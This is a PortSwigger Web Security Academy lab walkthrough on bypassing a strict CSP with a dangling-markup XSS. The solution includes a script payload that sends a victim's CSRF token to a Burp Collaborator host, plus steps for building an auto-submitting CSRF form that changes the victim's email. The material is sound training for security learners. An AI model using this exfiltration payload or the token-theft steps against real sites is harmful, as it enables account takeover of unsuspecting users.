# Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) protected by very strict [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy), with [dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) attack

This lab using a strict CSP that blocks outgoing requests to external web sites.

To solve the lab, first perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses the CSP and exfiltrates a simulated victim user's [CSRF](https://portswigger.net/web-security/csrf) token using Burp Collaborator. You then need to change the simulated user's email address to `hacker@evil-user.net`.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:

`<a href="">Click me</a>`

You can log in to your own account using the following credentials: `wiener:peter`

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.

 ####  Solution

1. Log in to the lab using the account provided above.
2. Examine the change email function. Observe that there is an XSS vulnerability in the `email` parameter.
3. Go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
4. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
5. Back in the lab, go to the exploit server and add the following code, replacing `YOUR-LAB-ID` and `YOUR-EXPLOIT-SERVER-ID` with your lab ID and exploit server ID respectively, and replacing `YOUR-COLLABORATOR-ID` with the payload that you just copied from Burp Collaborator.
    
    `<script> if(window.name) { new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name); } else { location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27'; } </script>`
6. Click "Store" and then "Deliver exploit to victim". When the user visits the website containing this malicious script, if they click on the "Click me" link while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this CSRF token using Burp Collaborator.
7. Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.
8. With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address.
9. In Burp, go to the intercepted request and change the value of the email parameter to `hacker@evil-user.net`.
10. Right-click on the request and, from the context menu, select "Engagement tools" and then "Generate CSRF PoC". The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier.
11. Click "Options" and make sure that the "Include auto-submit script" is activated.
12. Click "Regenerate" to update the CSRF HTML so that it contains the stolen token, then click "Copy HTML" to save it to your clipboard.
13. Drop the request and switch off the intercept feature.
14. Go back to the exploit server and paste the CSRF HTML into the body. You can overwrite the script that we entered earlier.
15. Click "Store" and "Deliver exploit to victim". The user's email will be changed to `hacker@evil-user.net`.
